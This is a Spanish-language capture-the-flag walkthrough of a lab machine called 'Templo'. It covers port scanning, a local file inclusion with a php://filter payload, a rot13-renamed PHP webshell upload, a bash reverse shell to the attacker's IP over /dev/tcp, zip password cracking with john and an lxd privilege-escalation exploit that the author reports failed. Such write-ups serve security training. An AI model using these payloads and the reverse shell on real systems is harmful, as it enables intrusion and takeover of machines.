PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-En el puerto 80 hay una web en la que observamos cierto incapié en la palabra --> NAMARI

-Probamos a introducirla en la ruta de la URL (IP/NAMARI)y encontramos una web de subida de archivos en la que hay un LFI (Local File Inclusion)
	-http://192.168.1.149/NAMARI/index.php?page=/etc/passwd

-Probamos con php wrappers para ver el contenido de 'index.php':
	-http://192.168.1.149/NAMARI/index.php?page=php://filter/convert.base64-encode/resource=index.php
		-Obtenemos una cadena en base64

-Decodificamos la cadena y vemos el código fuente de 'index.php':
	-echo 'cadena' | base64 -d 

-Lo que hace 'index.php' es codificar el nombre de los archivos que subimos en **rot13**. También vemos que los archivos se almacenan en /uploads

-Subimos una webshell en php y le decimos a chatgpt que nombre tendría nuestro archivo 'webshell.php' en rot13:
	-Nombre de nuestro archivo en rot13 --> jrofuryy.php

-Nos vamos a la siguiente ruta y nos mandamos una reverse shell desde la webshell:
	-http://192.168.1.149/NAMARI/uploads/jrofuryy.php?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.1.135/1234 0>%261'
	www-data@TheHackersLabs-Templo:/$


## Escalada de Privilegios

-Visitamos el directorio /opt y encontramos un archivo .zip:
	-backup.zip

-Nos lo transferimos a nuestra máquina y nos pide contraseña para descomprimirlo
	-zip2john backup.zip > hash.txt
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
		-password: batman

-Descomprimimos el archivo 'backup.zip' y encontramos la contraseña de 'rodgar':
	-unzip backup.zip
	-password: batman
	-cat cat Rodgar.txt
		6rK5£6iqF;o|8dmla859/_

-Pivotamos al usuario 'rodgar':
	-su rodgar
	-password: 6rK5£6iqF;o|8dmla859/_
		rodgar@TheHackersLabs-Templo:/$

-Vemos los grupos a los que pertenecemos con cualquiera de los siguientes comandos:
	-id
	-groups
	-Encontramos el siguiente:
		101(lxd)

-Podemos escalar privilegios a root con el siguiente exploit de S4vitar:
	-searchsploit lxd
			Ubuntu 18.04 - 'lxd' Privilege Escalation | linux/local/46978.sh

NOTA: No puedo escalar privilegios porque al ejecutar el 'build-alpine' me da error. Creo que es de mi máquina.

